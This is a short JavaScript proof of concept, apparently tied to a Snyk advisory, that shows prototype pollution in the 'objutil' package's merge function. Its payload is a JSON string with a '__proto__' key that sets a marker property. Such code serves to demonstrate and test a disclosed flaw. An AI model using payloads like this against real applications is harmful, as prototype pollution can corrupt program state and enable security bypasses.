//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496

 
  const { merge, remove } = require("objutil");

  let a = { x: 1, y: { w: 1, z: 2 } };
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  result = merge(a, JSON.parse(malicious_payload));
// End of file
